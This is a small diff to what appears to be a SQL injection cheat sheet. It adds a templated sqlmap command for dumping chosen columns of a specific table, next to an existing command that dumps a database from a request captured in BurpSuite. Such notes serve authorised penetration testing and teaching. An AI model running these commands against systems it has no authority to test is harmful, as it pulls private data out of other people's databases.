@@ -8,3 +8,8 @@ First, intercept the HTTP request using the vulnerable parameters using BurpSuit
 ```bash
 sqlmap -r [request_file] --dbms=[dbms] --dump
 ```
+
+## Dump a specific table
+```bash
+sqlmap -u [url] -D [database] -T [table] -C [columns] --dump
+```
